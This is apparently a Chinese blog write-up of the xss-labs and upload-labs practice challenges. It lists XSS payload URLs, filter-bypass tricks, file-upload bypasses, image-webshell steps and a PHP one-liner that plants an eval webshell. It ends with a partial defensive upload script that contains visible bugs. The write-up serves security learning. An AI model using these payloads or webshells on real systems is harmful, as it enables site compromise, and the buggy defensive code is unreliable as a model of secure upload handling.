title="level2"></a>level2</h3><p>html实体编码</p><p>这里要往表单input标签里面注入<br><code>http://192.168.68.219/xss/level2.php?keyword=aa%22%3E%3Cscript%3Ealert(1);%3C/script%3E</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715144909149.png" alt="image-20200715144909149"></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p><code>&lt;&gt;</code>被实体编码拦截，但是加<code>&#39;</code>或者<code>&quot;</code>会使得浏览器自动补全。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128120223330.png" alt="image-20201128120223330"></p><p>这里关注input标签，使用onfocus=alert(1) autofocus移动光标到元素上(或者点击)就可以触发弹窗。<br><code>http://192.168.68.219/xss/level3.php?keyword=11%27%20onfocus=alert(1)%20autofocus</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715151535637.png" alt="image-20200715151535637"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111939700.png" alt="image-20201128111939700"></p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>这里会在<code>=</code>后面添加<code>&quot;</code>于是onfocus=alert(1)不大行了（其实还是可以触发弹窗，不过不能触发window.alert()<br>既然会自动添加<code>&quot;</code>，那么刚好用”javascript:xxxx”的方式来绕过。（好吧这个也不能触发跳转<br><code>http://192.168.68.219/xss/level4.php?keyword=123%27%22%20onfocus=%22javascript:alert%281%29</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715152933866.png" alt="image-20200715152933866"></p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>过滤了script-&gt;s_cript    onload-&gt;o_nload<br>不知道为什么javascript:alert(1)没反应，明明解析出来都没问题。</p><p><code>http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Ca%20value=%2711111%27%20href=%22javascript:alert(1)</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160658462.png" alt="image-20200715160658462"></p><p><code>http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Cimg%20src=level5.png%20style=%22javascript:alert%281%29</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160638311.png" alt="image-20200715160638311"></p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>href-&gt;hr_ef<br>src-&gt;sr_c</p><p>懂了，原来考的是大小写绕过，那么前面几个题也可以按照这种方法来过。</p><p><code>http://192.168.68.219/xss/level6.php?keyword=111%22%20%3E%3CscRipt%3Ealert(1)%3C/scrIpt%3E</code></p><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>存在关键词过滤，这里可以使用双写关键字绕过过滤，并不能使用大小写绕过。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113421841.png" alt="image-20201128113421841"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113531000.png" alt="image-20201128113531000"></p><p><code>http://192.168.68.219/xss/level7.php?keyword=%22%20%3E%3Cscscriptript%3Ealert(1)%3C/scriscriptpt%3E</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128112539027.png" alt="image-20201128112539027"></p><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>非常神奇地在这儿卡了半天，因为一些编码的问题。</p><p>审计PHP的源代码，发现过滤了script等关键字，当然可以通过实体编码绕过，比如hex或者unicode，但是要命的是hex有可能在浏览器中被自动解码再发送，而unicode是以&amp;#开头。在url中，&amp;用来分割参数，#之后的部分不向后端发送，只在本地被使用(比如锚点定位)。</p><p>如 <code>keyword=javascrip&amp;#116;:alert(1)</code>,在后端，keyword只接受到<code>javascrip</code>，非常难过。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114131808.png" alt="image-20201128114131808"></p><p>又如<code>keyword=%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29</code>，只使用一次urlhex编码，然后被浏览器自动解码。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114214613.png" alt="image-20201128114214613"></p><p><strong>solution</strong></p><p>解决办法是使用两次编码，先unicode 后 urlhex。</p><p><code>javascript:alert(1)</code></p><p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p><p><code>%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B</code></p><p>payload:<code>keyword=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114408003.png" alt="image-20201128114408003"></p><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>在level8的基础之上，会检查网址格式是否包含http://，所以直接alert(‘http://‘)就好，其余和level8一样，只需要编码javascript就好。</p><p>level9.php?<code>keyword=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B:alert(%27http://%27)</code></p><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>检查到有三个隐藏的参数，那么首先就是要取消隐藏属性，然后构造xss触发弹窗就好，貌似没有之前的考点。</p><p><code>level10.php?keyword=well%20done!&amp;t_sort=a&quot;%20onfocus=javascript:alert(1)%20autofocus%20type=&quot;on</code></p><p><code>level10.php?keyword=well%20done!&amp;t_sort=a&quot;%20onmouseover=javascript:alert(1)%20autofocus%20type=&quot;on</code></p><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>这一关比较有意思，虽然t_sort可以被操纵，但是被编码了，没有利用的办法。注入点在refer里，所以只是把level10的payload写在refer里面就好。<br>Firefox好像可以拦截请求修改之后再放出去，但是没有取了解，这里用的是burp。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204721930.png" alt="image-20200715204721930"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204737776.png" alt="image-20200715204737776"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204810094.png" alt="image-20200715204810094"></p><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>类似的，只是注入的是useragent</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210259484.png" alt="image-20200715210259484"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210328418.png" alt="image-20200715210328418"></p><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>仍然是类似的，注入的是cookie</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210549269.png" alt="image-20200715210549269"></p><h3 id="level14–"><a href="#level14–" class="headerlink" title="level14–"></a>level14–</h3><p>不会，看了WP也不会的那种。</p><p><code>https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12</code></p><h3 id="level15–"><a href="#level15–" class="headerlink" title="level15–"></a>level15–</h3><p>angular倒是很有意思，但是不会。</p><p><code>https://www.runoob.com/angularjs/angularjs-intro.html</code></p><p>加载angular.js要科学上网，上网回来请求多了这一坨回来不知道怎么回事儿。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716114658159.png" alt="image-20200716114658159"></p><p>然后console里面就这样了，看上去level1.php是请求了，但是没有被加载到页面里。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716091758748.png" alt="image-20200716115010742"></p><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>一开始仿照以前的两次编码，写了这个payload，但是关键字不能被解析，反而一直被当成文本，想来可能是两次编码的问题。</p><p><code>level16.php?keywordcode></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716091758748.png" alt="image-20200716091758748"></p><p>后面还是上网了，看到可以用<code>%0d</code>(tab)和<code>%0a</code>(换行)来截断。</p><p><code>level16.php?keyword=1111%3Cimg%0asrc=1%0aonerror=%22javascript:alert(1)%22%3E%3Ccenter%3E</code></p><h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p>审查元素，可以发现GET参数实则是Flash脚本的参数。</p><p>通过查询flash xss相关文章，可以了解到jsFunction是个关键，构造payload使得jsFunction这个关键字被解析，从而跳出了src属性，然后使用常用的onmouseover属性方法加载xss payload。</p><p>jsFunction被解析为属性名。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128115239376.png" alt="image-20201128115239376"></p><p>然后使用onmouseover或者其他方法执行alert()语句，如果过滤空格，根据level16,可以用%0a绕过。</p><p><code>?arg01=1111&quot;&amp;arg02=eeeeee%20jsFunction%0aonmouseover=javascript:alert(1)</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128115638195.png" alt="image-20201128115638195"></p><h3 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h3><p>同样的套路。</p><p><code>?arg01=a&amp;arg02=b%20jsFunction%20onmouseover=javascript:alert(1)</code></p><h3 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h3><p><a href="https://www.freesion.com/article/6253464226/">https://www.freesion.com/article/6253464226/</a></p><p>抄袭payload: <code>arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(/xss/)%22%20onerror=%22javascript:alert(1)%22%3Exss%3C/a%3E</code></p><h3 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h3><p>竟然还需要逆向swf，那就只好抄了。</p><p><a href="https://blog.csdn.net/u014029795/article/details/103217680">https://blog.csdn.net/u014029795/article/details/103217680</a></p><h2 id="Upload-Lab"><a href="#Upload-Lab" class="headerlink" title="Upload-Lab"></a>Upload-Lab</h2><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>图片马的检测与绕过</p><p><a href="https://www.jianshu.com/p/744001fd0738">https://www.jianshu.com/p/744001fd0738</a></p><p><a href="http://www.nowamagic.net/librarys/veda/detail/1618">http://www.nowamagic.net/librarys/veda/detail/1618</a></p><p>文件上传绕过总览</p><p><a href="https://www.cnblogs.com/linuxsec/articles/12152431.html">https://www.cnblogs.com/linuxsec/articles/12152431.html</a></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717095509735.png" alt="image-20200717095509735"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716171248882.png" alt="image-20200717095703147"></p><h3 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h3><p>在console里找到前端验证代码，在burp里把后缀名改回来就好。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716171248882.png" alt="image-20200716171248882"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716171741323.png" alt="image-20200716171741323"></p><h3 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h3><p>验证虽然转移到了后端，但是规则却变得简单，只验证content-type，所以直接上传个php然后再burp里把content-type改成白名单里面的类型就好。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716172253219.png" alt="image-20200716172253219"></p><h3 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h3><p>过滤规则，php的函数需要去查一查，这里用到的是windows+php的一个特性。<br>当把文件命名为<code>xxx.yyy::$DATAzzz</code>时，windows会把<code>::DATA</code>之后的部分当作文件的数据流，于是文件名被保存为<code>xxx.yyy</code>。<br>虽然这里有对<code>::$DATA</code>的过滤，但是可以被双写绕过。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716173641821.png" alt="image-20200716173641821"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716173618738.png" alt="image-20200716173618738"></p><h3 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h3><p><strong>::$DATA</strong></p><p><a href="https://blog.0kami.cn/2018/04/15/hitb-xctf-2018-portion-web-writeup/">https://blog.0kami.cn/2018/04/15/hitb-xctf-2018-portion-web-writeup/</a></p><p>一开始本来是想<code>::$DATA</code>绕过的，比如<code>filename=shell.php::$DATApng</code>,检查时识别出的扩展名是<code>.phppng</code>，php存储文件时会把文件命名为<code>shell.php::$DATApng</code>，然后由于windows+php的特性，<code>::$DATApng</code>会被丢弃。<br>但是没有实践成功，这里出现的问题是<code>::$DATA</code>之后添加字符会报错，要么像下面这样被解析为后面的文件名。<br><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716193252913.png" alt="image-20200716193252913"></p><p><strong>.htaccess</strong></p><p><a href="https://www.jianshu.com/p/c674904a711e">https://www.jianshu.com/p/c674904a711e</a></p><p>上传.htaccess文件修改文件的解析规则</p><p>1.设置将文件名为shell的文件按php来解析</p><p><code>&lt;FilesMatch &quot;shell&quot;&gt;</code><br><code>SetHandler application/x-httpd-php Set&lt;/FilesMatch&gt;</code></p><p>2.将jpg文件按照php来解析</p><p><code>AddType application/x-httpd-php .jpg</code></p><p>3.htaccess自解析（未成功，没有htaccess的访问权限）</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716200635567.png" alt="image-20200716200635567"></p><h3 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h3><p>依然双写绕过</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716202858396.png" alt="image-20200716202858396"></p><h3 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h3><p>还能双写<code>::$DATA</code>绕过？！<br>确实还可以</p><h3 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h3><p>基本上ban掉了所有可以解析的后缀名，但是相对于之前的关卡，没有处理末尾的<code>.</code>，而php会自动忽略末尾的<code>.</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716212245934.png" alt="image-20200716212245934"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716212132927.png" alt="image-20200716212132927"></p><h3 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h3><p>因为这里又是随机重命名，然后后缀名取得是处理后的字符串，所以又可以回到::$DATA绕过。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716213324517.png" alt="image-20200716213324517"></p><h3 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h3><p>存储的文件名是上传名去<code>.</code>过后的，但是验证还要过滤掉一个空格，又结合前面忽略最后的<code>.</code>构造payload。（向大佬低头，没想出来）</p><p><code>filename=&quot;shell08.php. .&quot;</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716223751307.png" alt="image-20200716223751307"></p><h3 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h3><p>过滤php等关键字，由xss的思路，双写绕过。</p><p><code>filename=&quot;shell10.phphpp&quot;</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716224345049.png" alt="image-20200716224345049"></p><h3 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h3><p>虽然我也想到了%00字符截断，但是没有想起来%00会自动转码，而直接在burp里改hex会导致服务器报错。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716232433594.png" alt="image-20200716232433594"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716232619081.png" alt="image-20200716232619081"></p><h3 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h3><p>承接pass-11，由于这里save_path是POST过去的，所以需要在burp里面改hex。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716233256871.png" alt="image-20200716233256871"></p><h3 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h3><p>先上传个图片马上去，因为只会检查文件的前两个字节，所以把前两个字节改成相应文件的格式头就好。<br>下一步是利用文件包含漏洞，利用upload-labs/include.php来解析刚刚上传的图片马。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717102154922.png" alt="image-20200717102154922"></p><p>虽然刚刚上传的xxx.jpg是个”图片“，但是通过include.php的文件包含include 来解析时会按照php来解析。<br>[准确来说是按照服务器当前脚本语言来解析，文件包含机制是为了更好地支持代码重用]<br>虽然文件的内容并不是以&lt;?php开头，但是php会默认丢弃不规范的内容，从&lt;?php开始解析。</p><p>于是有payload=<code>/upload-labs/include.php?file=./upload/5120200717095119.jpg</code></p><p><strong>如果</strong>php开启了allow_url_include还可以直接在url中用php伪协议直接包含刚刚上传的图片马。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717103529716.png" alt="image-20200717103529716"></p><h3 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h3><p><code>cmd&gt;copy image.png/b + shell.php/a shell.png</code></p><p>传是传上去了，也绕过了检测，但是文件包含之后不能解析，老是报错。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717143714809.png" alt="image-20200717143714809"></p><p><strong>破案</strong>：大概是图片有点儿大，里面有些神奇字符破坏了php的解析。重新做一个小一点儿图片马就过了。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717143646731.png" alt="image-20200717143646731"></p><h3 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h3><p>继续用pass-14的图片马，记得现在服务器的PHPstudy里把ph_exif开关打开。</p><p>依然不能解析利用。[解决方法同上]</p><h3 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h3><p>二次渲染</p><h3 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h3><p>直接上传shell.php改后缀名，然后文件包含。</p><h3 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h3><p>条件竞争</p><p>需要注意的是文件上传之后先以原文件名存储，然后再基于时间随机命名。<br>在存储之后到重命名之前，刚刚上传的文件是可以被我们主动访问到的（只要我们访问的时间足够巧）。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717162914017.png" alt="image-20200717162914017"></p><p>那么就在这个图片里写个马儿，用这个马儿生成另外一个马儿供长期访问（不被重命名）。<br>写个python不断请求include.php去解析上传的图片希望能够生成马儿，因为时机稍纵即逝，所以上传图片这边也需要用Burp不断重发(手动还是自动intruder视环境而定)。一旦include.php解析图片成功，那么就可以访问生成的马儿了。</p><p><code>&lt;?php fputs(fopen(&#39;shell2.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;x&quot;])?&gt;&#39;);?&gt;</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717162713518.png" alt="image-20200717162713518"></p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><p>利用临时文件。</p><p><a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>虽然temp临时文件会在程序结束之后被删除，但是谁说程序总能正常结束呢？<br>使用文件包含功能不断地自我包含会导致php异常退出来处理错误，于是没有去删除临时文件，可以通过暴力猜测文件名访问到文件。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200718150214528.png" alt="image-20200718150214528"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200718145457471.png" alt="image-20200718145457471"></p><h3 id="课后作业：安全文件上传"><a href="#课后作业：安全文件上传" class="headerlink" title="课后作业：安全文件上传"></a>课后作业：安全文件上传</h3><p>这里通过两种手段尝试实现文件上传过程中的防御。</p><h4 id="白名单-随机重命名"><a href="#白名单-随机重命名" class="headerlink" title="白名单+随机重命名"></a>白名单+随机重命名</h4><p>文件的存储路径已经通过预定义的方式被系统控制，然后通过随机重命名控制文件的名称，最后基于白名单严格控制文件的扩展名。<br>在没有文件包含或者.htaccess解析漏洞的前提下，文件上传是安全的。</p><h4 id="重采样-头部元数据检测"><a href="#重采样-头部元数据检测" class="headerlink" title="重采样+头部元数据检测"></a>重采样+头部元数据检测</h4><p>在存在文件包含或者.htaccess解析漏洞时，第一个方法可以被图片马绕过。<br>图片马攻击成功的本质是图片二进制数据包含php语句且该图片以php格式被解析，由于预设已经存在解析漏洞，那么只能在php语句检测上想办法。<br>利用php-GD扩展的imageCopyResampled()通过像素插值算法修改图片元数据，可以破坏php语句。但是这还不够，因为图片数据中往往存在一部分辅助数据不受重采样的影响，而php语句可以被注入到这些辅助数据块中免于被破环。<br>于是，可以通过检测辅助数据块的方式检测其中的php语句。辅助数据快往往存在于文件流的头部且长度较小，虽然从格式标准而言辅助数据块可以很长，但是一般情况下是较短的，如果被恶意构造得很长，可以武断地判为恶意图片。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$t</span>=time();</span><br><span class="line">    <span class="variable">$new_name</span>=date(<span class="string">&quot;Ymd&quot;</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$allchar</span> = <span class="string">&quot;abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span> ; </span><br><span class="line">    srand(mktime());</span><br><span class="line">    <span class="keyword">for</span>( <span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">8</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$new_name</span>.=substr(<span class="variable">$allchar</span>,rand()%<span class="number">52</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$new_name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExt</span>(<span class="params"><span class="variable">$orign_file_name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ext</span>=strrchr(<span class="variable">$orign_file_name</span>,<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="variable">$ext</span>=trim(<span class="variable">$ext</span>);</span><br><span class="line">    <span class="variable">$ext</span>=strtolower(<span class="variable">$ext</span>);</span><br><span class="line">    <span class="variable">$white_list</span>=<span class="keyword">array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.jpeg&quot;</span>,<span class="string">&quot;.pdf&quot;</span>,<span class="string">&quot;.doc&quot;</span>,<span class="string">&quot;.docx&quot;</span>,<span class="string">&quot;.md&quot;</span>,<span class="string">&quot;.txt&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,<span class="string">&quot;.pttx&quot;</span>,<span class="string">&quot;.xls&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>,<span class="variable">$white_list</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reCodeImg</span>(<span class="params"><span class="variable">$tmpImg</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//我们在这里针对性地检查图片马，具体使用重采样和固定元数据内容敏感检测结合的方法</span></span><br><span class="line"><span class="comment">//首先重采样，破坏图片内容中的shell语句</span></span><br><span class="line"><span class="variable">$newTmpImg</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span>=imagesx(<span class="variable">$tmpImg</span>);</span><br><span class="line"><span class="variable">$y</span>=imagesy(<span class="variable">$tmpImg</span>);</span><br><span class="line">imagecopyresampled(<span class="variable">$newTmpImg</span>, <span class="variable">$tmpImg</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$x</span>, <span class="variable">$y</span>, <span class="variable">$x</span>, <span class="variable">$y</span>);</span><br><span class="line"><span class="variable">$handler</span>=fopen(<span class="variable">$newTmpImg</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$metadata</span>=fread(<span class="variable">$handler</span>,<span class="number">2048</span>);</span><br><span class="line"><span class="keyword">if</span>(!strrpos(<span class="variable">$meat</span>,<span class="string">&quot;IDAT&quot;</span>) <span class="keyword">or</span> strripos(<span class="variable">$metadata</span>, <span class="string">&quot;php&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$newTmpImg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file(<span class="variable">$temp_file</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span>=<span class="string">&quot;上传错误！&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$new_file_name</span>=random_name();</span><br><span class="line">        <span class="variable">$new_file_ext</span> =getExt(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$new_file_ext</span>==<span class="string">&quot;unknown&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$msg</span>=<span class="string">&quot;未知图片类型，不能上传&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$new_file_ext</span>, <span class="keyword">array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.jpeg&quot;</span>)))&#123;<span 